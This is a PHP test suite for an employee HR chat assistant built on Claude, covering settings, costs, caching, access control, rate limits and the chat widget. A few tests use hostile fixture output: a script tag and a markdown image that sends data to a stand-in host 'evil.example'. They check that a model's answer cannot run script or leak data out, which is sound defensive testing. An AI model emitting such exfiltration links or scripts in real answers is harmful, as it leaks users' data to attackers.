<?php

namespace App\Modules\Chatbox\Tests;

use App\Models\Employee;
use App\Modules\Chatbox\Exceptions\ChatboxException;
use App\Modules\Chatbox\Filament\Pages\ChatboxSettingsPage;
use App\Modules\Chatbox\Livewire\ChatWidget;
use App\Modules\Chatbox\Models\ChatConversation;
use App\Modules\Chatbox\Models\ChatMessage;
use App\Modules\Chatbox\Reports\ChatboxUsageReport;
use App\Modules\Chatbox\Services\ChatboxAssistant;
use App\Modules\Chatbox\Services\ChatboxCost;
use App\Modules\Chatbox\Services\ChatboxSettings;
use App\Modules\Chatbox\Services\ChatTurn;
use App\Modules\ReportFilters;
use Carbon\CarbonImmutable;
use Filament\Facades\Filament;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\RateLimiter;
use Livewire\Livewire;
use Tests\Concerns\CreatesEmployees;
use Tests\TestCase;

class ChatboxTest extends TestCase
{
    use CreatesEmployees;
    use MakesChatbox;
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->prepareAdminPanel();
        $this->fakeClaude();
        RateLimiter::clear('chatbox:1');
    }

    private function ask(Employee $employee, string $question, ?ChatConversation $conversation = null): ChatMessage
    {
        return app(ChatboxAssistant::class)->ask($employee, $conversation, $question, fn () => null);
    }

    // --- Settings

    public function test_the_api_key_is_stored_encrypted_and_a_blank_key_keeps_it(): void
    {
        $settings = app(ChatboxSettings::class);
        $settings->update(['enabled' => true, 'api_key' => 'sk-ant-secret']);

        $stored = DB::table('settings')->where('key', 'chatbox.api_key')->value('value');
        $this->assertNotSame('sk-ant-secret', $stored);
        $this->assertStringNotContainsString('sk-ant-secret', $stored);
        $this->assertSame('sk-ant-secret', $settings->apiKey());
        $this->assertArrayNotHasKey('api_key', $settings->all());

        $settings->update(['enabled' => true, 'api_key' => '']);
        $this->assertSame('sk-ant-secret', $settings->apiKey());
    }

    public function test_the_assistant_is_ready_only_with_the_switch_the_key_and_something_to_answer_from(): void
    {
        $settings = app(ChatboxSettings::class);
        $this->assertFalse($settings->isReady());

        $settings->update(['enabled' => true, 'api_key' => 'sk-ant-key']);
        $this->assertFalse($settings->isReady(), 'no document and no data to look up yet');

        $document = $this->setUpAssistant();
        $this->assertTrue($settings->isReady());

        $document->update(['enabled' => false]);
        $this->assertFalse($settings->isReady(), 'a document that is switched off does not count');

        $this->enableTools(['leave_balance']);
        $this->assertTrue($settings->isReady(), 'data to look up is enough');

        $settings->update(['enabled' => false]);
        $this->assertFalse($settings->isReady());
    }

    public function test_an_unknown_model_falls_back_to_the_default(): void
    {
        app(ChatboxSettings::class)->update(['model' => 'gpt-4']);

        $this->assertSame(ChatboxSettings::DEFAULT_MODEL, app(ChatboxSettings::class)->model());
    }

    public function test_an_employee_cannot_open_the_settings(): void
    {
        $this->actingAs($this->makeEmployee('Alice'));

        $this->get(ChatboxSettingsPage::getUrl())->assertForbidden();
    }

    public function test_the_admin_saves_the_settings_and_the_key_is_never_in_the_form(): void
    {
        $this->loginAsAdmin();

        Livewire::test(ChatboxSettingsPage::class)
            ->fillForm(['enabled' => true, 'api_key' => 'sk-ant-new', 'model' => 'claude-haiku-5-5', 'hourly_limit' => 10, 'hr_contact' => 'hr@example.com'])
            ->call('save')
            ->assertHasNoFormErrors()
            ->assertSchemaStateSet(['api_key' => null, 'model' => 'claude-haiku-5-5', 'hourly_limit' => 10]);

        $settings = app(ChatboxSettings::class);
        $this->assertSame('sk-ant-new', $settings->apiKey());
        $this->assertSame('claude-haiku-5-5', $settings->model());
        $this->assertSame(10, $settings->hourlyLimit());
    }

    public function test_the_key_is_required_when_the_assistant_is_switched_on(): void
    {
        $this->loginAsAdmin();

        Livewire::test(ChatboxSettingsPage::class)
            ->fillForm(['enabled' => true, 'api_key' => null, 'model' => 'claude-opus-5-5', 'hourly_limit' => 30])
            ->call('save')
            ->assertHasFormErrors(['api_key' => 'required']);
    }

    public function test_the_connection_test_reports_success_and_failure(): void
    {
        $this->loginAsAdmin();
        app(ChatboxSettings::class)->update(['api_key' => 'sk-ant-key']);

        Livewire::test(ChatboxSettingsPage::class)
            ->callAction('test')
            ->assertNotified('Connected to Claude');

        $this->claude->failure = new ChatboxException('Claude refused the API key (401).');
        Livewire::test(ChatboxSettingsPage::class)
            ->callAction('test')
            ->assertNotified('Connection failed');
    }

    // --- Cost

    public function test_the_cost_of_a_question_is_much_lower_with_a_warm_cache(): void
    {
        $opus = ChatboxCost::perQuestion(30_000, 'claude-opus-5-5');
        $haiku = ChatboxCost::perQuestion(30_000, 'claude-haiku-5-5');

        // 30,000 tokens read from the cache at $0.20 per million, plus 500 fresh input and 400 output tokens
        $this->assertEqualsWithDelta(0.006 + 0.002 + 0.008, $opus['warm'], 0.0001);
        // The same tokens written to the one-hour cache at twice the $4 input price
        $this->assertEqualsWithDelta(0.24 + 0.002 + 0.008, $opus['cold'], 0.0001);
        $this->assertLessThan($opus['cold'] / 10, $opus['warm']);
        $this->assertLessThan($opus['warm'], $haiku['warm']);
        $this->assertNull(ChatboxCost::perQuestion(1000, 'gpt-4'));
        $this->assertSame('less than $0.001', ChatboxCost::format(0.0004));
        $this->assertSame('$0.016', ChatboxCost::format(0.016));
        $this->assertSame('$0.25', ChatboxCost::format(0.25));
    }

    public function test_every_model_that_can_be_chosen_has_a_price_and_the_other_way_round(): void
    {
        $this->assertEqualsCanonicalizing(array_keys(ChatboxSettings::MODELS), array_keys(ChatboxCost::PRICES), 'the two tables must not drift apart');
        $this->assertArrayHasKey(ChatboxSettings::DEFAULT_MODEL, ChatboxCost::PRICES);
    }

    // --- Asking

    public function test_a_question_is_answered_and_saved_with_the_usage(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $streamed = [];

        $answer = app(ChatboxAssistant::class)->ask($alice, null, 'How many days of annual leave?', function (string $delta) use (&$streamed) {
            $streamed[] = $delta;
        });

        $this->assertSame(['The handbook says ', '14 days.'], $streamed);
        $this->assertSame('The handbook says 14 days.', $answer->content);
        $this->assertSame([40, 12, 5000], [$answer->input_tokens, $answer->output_tokens, $answer->cache_read_tokens]);

        $conversation = $answer->conversation;
        $this->assertSame($alice->id, $conversation->employee_id);
        $this->assertSame('How many days of annual leave?', $conversation->title);
        $this->assertSame(['user', 'assistant'], $conversation->messages->pluck('role')->all());
    }

    public function test_the_handbook_goes_in_the_cached_system_prompt_with_the_chosen_model(): void
    {
        $this->setUpAssistant(['model' => 'claude-haiku-5-5']);

        $this->ask($this->makeEmployee('Alice'), 'Question?');

        $call = $this->claude->calls[0];
        $this->assertSame('claude-haiku-5-5', $call['model']);
        $this->assertCount(2, $call['system']);
        $this->assertStringContainsString('hr@example.com', $call['system'][0]['text']);
        $this->assertStringContainsString('14 days of annual leave', $call['system'][1]['text']);
        $this->assertStringContainsString('<document label="Staff handbook"', $call['system'][1]['text']);
        $this->assertSame(['type' => 'ephemeral', 'ttl' => '1h'], $call['system'][1]['cache_control'], 'one hour: few questions, so five minutes would often miss');
        $this->assertArrayNotHasKey('cache_control', $call['system'][0]);
        $this->assertSame([['role' => 'user', 'content' => 'Question?']], $call['messages']);
    }

    public function test_the_system_prompt_does_not_change_between_questions(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');

        $first = $this->ask($alice, 'One?');
        $this->ask($alice, 'Two?', $first->conversation);

        $this->assertSame($this->claude->calls[0]['system'], $this->claude->calls[1]['system'], 'a changing prompt would never hit the cache');
    }

    public function test_a_follow_up_question_sends_the_chat_so_far(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');

        $first = $this->ask($alice, 'First?');
        $this->ask($alice, 'Second?', $first->conversation);

        $this->assertSame(
            [
                ['role' => 'user', 'content' => 'First?'],
                ['role' => 'assistant', 'content' => 'The handbook says 14 days.'],
                ['role' => 'user', 'content' => 'Second?'],
            ],
            $this->claude->calls[1]['messages'],
        );
        $this->assertSame(1, ChatConversation::query()->count());
    }

    public function test_only_the_last_messages_are_sent_and_they_start_with_a_question(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $conversation = ChatConversation::query()->create(['employee_id' => $alice->id, 'title' => 'Long']);
        for ($i = 1; $i <= 15; $i++) {
            $conversation->messages()->create(['role' => 'user', 'content' => "Q$i"]);
            $conversation->messages()->create(['role' => 'assistant', 'content' => "A$i"]);
        }

        $this->ask($alice, 'Latest?', $conversation);

        $sent = $this->claude->calls[0]['messages'];
        $this->assertLessThanOrEqual(ChatboxAssistant::HISTORY, count($sent));
        $this->assertSame('user', $sent[0]['role']);
        $this->assertSame('Latest?', end($sent)['content']);
    }

    public function test_an_employee_cannot_continue_the_chat_of_someone_else(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $bob = $this->makeEmployee('Bob');
        $chat = $this->ask($alice, 'Private question')->conversation;

        $this->expectException(ChatboxException::class);
        try {
            $this->ask($bob, 'Hijack', $chat);
        } finally {
            $this->assertSame(0, ChatMessage::query()->where('content', 'Hijack')->count());
            $this->assertCount(1, $this->claude->calls, 'Claude is not asked');
        }
    }

    public function test_an_empty_or_too_long_question_is_refused(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');

        foreach (['', '   ', str_repeat('a', ChatboxAssistant::MAX_QUESTION_LENGTH + 1)] as $question) {
            try {
                $this->ask($alice, $question);
                $this->fail('Refused: '.strlen($question));
            } catch (ChatboxException) {
                // expected
            }
        }
        $this->assertSame([], $this->claude->calls);
    }

    public function test_the_hourly_limit_stops_the_next_question(): void
    {
        $this->setUpAssistant(['hourly_limit' => 2]);
        $alice = $this->makeEmployee('Alice');
        RateLimiter::clear('chatbox:'.$alice->id);

        $this->ask($alice, 'One?');
        $this->ask($alice, 'Two?');

        try {
            $this->ask($alice, 'Three?');
            $this->fail('The third question is over the limit');
        } catch (ChatboxException $e) {
            $this->assertStringContainsString('2 questions', $e->getMessage());
        }
        $this->assertCount(2, $this->claude->calls);

        // The limit is per employee
        $this->ask($this->makeEmployee('Bob'), 'Bob asks');
        $this->assertCount(3, $this->claude->calls);
    }

    public function test_nothing_is_asked_while_the_assistant_is_not_set_up(): void
    {
        $this->expectException(ChatboxException::class);
        try {
            $this->ask($this->makeEmployee('Alice'), 'Question?');
        } finally {
            $this->assertSame([], $this->claude->calls);
        }
    }

    public function test_a_failed_request_keeps_the_question_and_the_chat_but_saves_no_answer(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $this->claude->failure = new ChatboxException('The assistant is very busy right now.');

        try {
            $this->ask($alice, 'Question?');
            $this->fail('The failure reaches the caller');
        } catch (ChatboxException $e) {
            $this->assertNotNull($e->conversationId);
            $conversation = ChatConversation::query()->findOrFail($e->conversationId);
            $this->assertSame(['user'], $conversation->messages->pluck('role')->all());
        }
    }

    public function test_a_refusal_and_an_empty_answer_get_a_polite_text(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');

        $this->claude->reply = new ChatTurn('partial text', refused: true);
        $this->assertSame(ChatboxAssistant::REFUSED, $this->ask($alice, 'Question?')->content);

        $this->claude->reply = new ChatTurn('  ');
        $this->assertSame(ChatboxAssistant::EMPTY, $this->ask($alice, 'Question?')->content);
    }

    // --- The chat bubble

    public function test_the_widget_answers_and_remembers_the_chat(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $this->actingAs($alice);
        Filament::setCurrentPanel('portal');

        $component = Livewire::test(ChatWidget::class)
            ->call('ask', 'How many days?')
            ->assertSet('error', null)
            ->assertSee('How many days?')
            ->assertSee('The handbook says 14 days.');

        $this->assertNotNull($component->get('conversationId'));
        $this->assertSame(1, ChatConversation::query()->where('employee_id', $alice->id)->count());

        // New chat, then back to the old one
        $id = $component->get('conversationId');
        $component->call('newChat')->assertSet('conversationId', null)->assertDontSee('The handbook says 14 days.');
        $component->call('openChat', $id)->assertSet('conversationId', $id)->assertSee('The handbook says 14 days.');
    }

    public function test_the_message_of_the_employee_is_in_a_tight_span_so_the_bubble_stays_small(): void
    {
        $this->setUpAssistant();
        $this->actingAs($this->makeEmployee('Alice'));

        // The bubble keeps the whitespace of the template out: only this span keeps the lines the employee typed
        Livewire::test(ChatWidget::class)
            ->call('ask', 'How many days?')
            ->assertSeeHtml('<span class="chatbox-text">How many days?</span>');
    }

    public function test_the_widget_shows_the_error_of_a_failed_request(): void
    {
        $this->setUpAssistant();
        $this->actingAs($this->makeEmployee('Alice'));
        $this->claude->failure = new ChatboxException('The assistant is very busy right now.');

        Livewire::test(ChatWidget::class)
            ->call('ask', 'Question?')
            ->assertSet('error', 'The assistant is very busy right now.')
            ->assertSee('The assistant is very busy right now.');
    }

    public function test_an_employee_sees_and_opens_only_their_own_chats(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $bob = $this->makeEmployee('Bob');
        $alicesChat = $this->ask($alice, 'Alice private question')->conversation;

        $this->actingAs($bob);
        Livewire::test(ChatWidget::class)
            ->assertDontSee('Alice private question')
            ->call('openChat', $alicesChat->id)
            ->assertSet('conversationId', null)
            ->assertDontSee('Alice private question')
            ->call('deleteChat', $alicesChat->id);

        $this->assertNotNull(ChatConversation::query()->find($alicesChat->id), "Bob cannot delete Alice's chat");
    }

    public function test_an_employee_can_delete_their_own_chat(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $chat = $this->ask($alice, 'Forget me')->conversation;

        $this->actingAs($alice);
        Livewire::test(ChatWidget::class)->call('deleteChat', $chat->id);

        $this->assertNull(ChatConversation::query()->find($chat->id));
        $this->assertSame(0, ChatMessage::query()->count());
    }

    public function test_the_answer_is_shown_as_escaped_markdown(): void
    {
        $this->setUpAssistant();
        $this->claude->deltas = ['**Bold** <script>alert(1)</script>'];
        $this->actingAs($this->makeEmployee('Alice'));

        Livewire::test(ChatWidget::class)
            ->call('ask', 'Question?')
            ->assertSeeHtml('<strong>Bold</strong>')
            ->assertDontSeeHtml('<script>alert(1)</script>');
    }

    public function test_an_image_in_an_answer_is_not_shown_so_it_cannot_carry_data_out(): void
    {
        $this->setUpAssistant();
        $this->claude->deltas = ['Your balance. ![x](https://evil.example/collect?d=6-days) And [a link](javascript:alert(1)).'];
        $this->actingAs($this->makeEmployee('Alice'));

        Livewire::test(ChatWidget::class)
            ->call('ask', 'Question?')
            ->assertSee('Your balance.')
            ->assertDontSeeHtml('<img')
            ->assertDontSee('evil.example')
            ->assertDontSeeHtml('javascript:');
    }

    public function test_the_bubble_is_on_the_portal_only_when_the_assistant_is_ready(): void
    {
        $alice = $this->makeEmployee('Alice');
        $this->actingAs($alice);

        $this->get('/portal')->assertOk()->assertDontSee('chatbox-fab', false);

        $this->setUpAssistant();
        $this->get('/portal')->assertOk()->assertSee('chatbox-fab', false);

        app(ChatboxSettings::class)->update(['enabled' => false]);
        $this->get('/portal')->assertOk()->assertDontSee('chatbox-fab', false);
    }

    public function test_the_bubble_is_not_on_the_admin_panel(): void
    {
        $this->setUpAssistant();
        $this->loginAsAdmin();

        $this->get('/')->assertOk()->assertDontSee('chatbox-fab', false);
    }

    // --- The usage report

    public function test_the_usage_report_counts_without_showing_what_was_asked(): void
    {
        $this->setUpAssistant();
        $alice = $this->makeEmployee('Alice');
        $bob = $this->makeEmployee('Bob');
        $first = $this->ask($alice, 'My secret medical question');
        $this->ask($alice, 'Another one', $first->conversation);
        $this->ask($bob, 'Bob asks');

        $result = (new ChatboxUsageReport)->run(new ReportFilters(CarbonImmutable::now()->startOfMonth(), CarbonImmutable::now()->endOfMonth()));

        $this->assertCount(1, $result->rows);
        $row = $result->rows[0];
        $this->assertSame(3, $row['questions']);
        $this->assertSame(2, $row['employees']);
        $this->assertSame(3 * 40, $row['input_tokens']);
        $this->assertSame(3 * 12, $row['output_tokens']);
        $this->assertSame(3 * 5000, $row['cache_read_tokens']);
        $this->assertSame('3', $result->stats[0]->value);
        $this->assertSame('2', $result->stats[1]->value);

        $everything = json_encode([$result->rows, $result->stats, $result->chart?->toArray(), $result->note]);
        $this->assertStringNotContainsString('secret medical', $everything);
        $this->assertStringNotContainsString('Bob asks', $everything);
    }

    public function test_the_usage_report_respects_the_period(): void
    {
        $this->setUpAssistant();
        $this->ask($this->makeEmployee('Alice'), 'Today?');

        $lastYear = new ReportFilters(CarbonImmutable::now()->subYear()->startOfYear(), CarbonImmutable::now()->subYear()->endOfYear());

        $this->assertSame([], (new ChatboxUsageReport)->run($lastYear)->rows);
    }
}
